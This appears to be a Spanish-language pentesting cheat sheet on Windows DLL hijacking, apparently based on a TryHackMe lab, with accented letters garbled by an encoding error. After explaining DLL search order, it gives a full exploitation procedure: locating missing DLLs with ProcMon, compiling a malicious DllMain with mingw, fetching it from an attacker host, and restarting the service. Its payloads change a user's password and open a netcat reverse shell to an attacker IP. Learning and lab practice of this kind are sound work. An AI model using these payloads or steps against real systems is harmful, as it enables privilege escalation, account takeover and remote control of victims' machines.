# DLL hijacking (DLL path abuse)

## DLL Hijacking

*   Orden de b煤squeda de DLL

    \<aside> 馃挕 En resumen, para las aplicaciones de escritorio est谩ndar, Windows seguir谩 uno de los 贸rdenes que se enumeran a continuaci贸n dependiendo de si SafeDllSearchMode est谩 habilitado o no.

    Si **SafeDllSearchMode** est谩 habilitado, el orden de b煤squeda es el siguiente:

    1. El directorio desde el que se carg贸 la aplicaci贸n.
    2. El directorio del sistema. Utilice la funci贸n [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.
    3. El directorio del sistema de 16 bits. No hay ninguna funci贸n que obtenga la ruta de este directorio, pero se busca.
    4. El directorio de Windows. Utilice la funci贸n [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
    5. El directorio actual.
    6. Los directorios que se enumeran en la variable de entorno PATH. Tenga en cuenta que esto no incluye la ruta por aplicaci贸n especificada por la clave de registro de **App Paths .** La clave **App Paths** no se utiliza al calcular la ruta de b煤squeda de DLL .

    Si **SafeDllSearchMode** est谩 deshabilitado, el orden de b煤squeda es el siguiente:

    1. El directorio desde el que se carg贸 la aplicaci贸n.
    2. El directorio actual.
    3. El directorio del sistema. Utilice la funci贸n [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.
    4. El directorio del sistema de 16 bits. No hay ninguna funci贸n que obtenga la ruta de este directorio, pero se busca.
    5. El directorio de Windows. Utilice la funci贸n [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
    6. Los directorios que se enumeran en la variable de entorno PATH. Tenga en cuenta que esto no incluye la ruta por aplicaci贸n especificada por la clave de registro de **App Paths .** La clave **App Paths** no se utiliza al calcular la ruta de b煤squeda de DLL . \</aside>
*   Gu铆a de explotaci贸n

    ```powershell
    # Ver si hay DLL faltantes que sean requerido por aplicativos
    Process Monitor (ProcMon)
    ```

    ProcMon requerir谩 privilegios administrativos para funcionar, esta no es una vulnerabilidad que pueda descubrir en el sistema de destino. Si desea verificar cualquier software en busca de posibles vulnerabilidades de secuestro de DLL, deber谩 instalar el software en su entorno de prueba y realizar una investigaci贸n all铆.

    La siguiente captura de pantalla le muestra qu茅 buscar en la interfaz de ProcMon. Ver谩 que algunas entradas dieron como resultado "NOMBRE NO ENCONTRADO".

    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/2bffcc52df1b20dd298154b4da9b52ae.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/2bffcc52df1b20dd298154b4da9b52ae.png)

    Las dos 煤ltimas l铆neas de la captura de pantalla anterior muestran que dllhijackservice.exe est谩 intentando iniciar hijackme.dll en la carpeta "C:\Temp" pero no puede encontrar este archivo. Este es un caso t铆pico de un archivo DLL faltante.

    {% code overflow="wrap" %}
    ```powershell
    # El segundo paso del ataque consistir谩 en que creemos este archivo en esa ubicaci贸n espec铆fica. Es importante que tengamos permisos de escritura para cualquier carpeta que deseemos usar para el secuestro de DLL. 

    #En este caso, la ubicaci贸n es la carpeta Temp para la que casi todos los usuarios tienen permisos de escritura; si se tratara de una carpeta diferente, tendr铆amos que comprobar los permisos.
    ```
    {% endcode %}

    **Creando el archivo  malicioso**

    Como se mencion贸 anteriormente, los archivos DLL son archivos ejecutables. Ser谩n ejecutados por el archivo ejecutable y se ejecutar谩n los comandos que contienen. El archivo DLL que crearemos podr铆a ser un shell inverso o un comando del sistema operativo seg煤n lo que queramos lograr en el sistema de destino o seg煤n las limitaciones de configuraci贸n. El siguiente ejemplo es un archivo DLL esqueleto que puede adaptar seg煤n sus necesidades.

    C贸digo esqueleto para la DLL maliciosa: windows\_dll.c

    ```
    #include <windows.h>

    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k whoami > C:\\\\Temp\\\\dll.txt");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```

    Dejando a un lado las partes repetitivas, puede ver que este archivo ejecutar谩 el `whoami`comando ( `cmd.exe /k whoami`) y guardar谩 la salida en un archivo llamado "dll.txt".

    El compilador mingw se puede usar para generar el archivo DLL con el siguiente comando y con el nombre que requerimos, que es hijackme.dll que vimos que busca el servicio:

    ```powershell
    x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
    ```

    \<aside> 馃挕 Puede instalar f谩cilmente el compilador Mingw usando el comando apt install gcc-mingw-w64-x86-64

    \</aside>

    Una vez compilado, necesitaremos mover el archivo hijackme.dll a la carpeta Temp en nuestro sistema target. Puede usar el siguiente comando de PowerShell para descargar el archivo .dll en el sistema de destino:

    ```powershell
    wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll
    ```

    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/6dd2070eda0924f1b6d601e63301fe05.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/6dd2070eda0924f1b6d601e63301fe05.png)

    Tendremos que detener e iniciar el servicio dllsvc nuevamente usando el siguiente comando:

    `sc stop dllsvc & sc start dllsvc`

    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a5fc76aa33e941941182d36a6c83e11f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a5fc76aa33e941941182d36a6c83e11f.png)

    Puede conectarse a la m谩quina de destino usando RDP en su m谩quina atacante o inici谩ndolo directamente desde su navegador.

Procedimiento:

{% code overflow="wrap" %}
```powershell
# 1. Ver si hay DLL faltantes que sean requerido por aplicativos
Process Monitor (ProcMon)

# 2. Crear archivo.c con c贸digo que queremos como payload
nano windows_dll.c   # ver abajo payloads

# 3. Compilarlo el .c en DLL nombr谩ndolo como el DLL que necesita alg煤n servicio, seg煤n detectamos anteriormente con ProcMon
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

# 4. Descargarlo en Temp o en directorio que cualquiera pueda ejecutar
wget -O hijackme.dll Attacker_IP:PORT/hijackme.dll

# 5. Detener y reiniciar el servicio que va a utilizar el dll
sc stop <servicio> & sc start <servicio>

# El servicio ejecutar谩 el DLL
```
{% endcode %}

*   Ejemplos

    Este script c cambia la contrase帽a de un usuario a la que queremos. Debemos indicar nombre del output dll.txt

    ```c
    #include <windows.h>

    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k net user jack Password11");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```

    Reverse shell ejecutando netcat, rrequiere tener un exe de netcat en el windows target:

    ```c
    #include <windows.h>

    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k nc.exe -e cmd.exe <Attacker_IP> <PORT>");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```

    Shells windows:

    [Shells - Windows](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows)
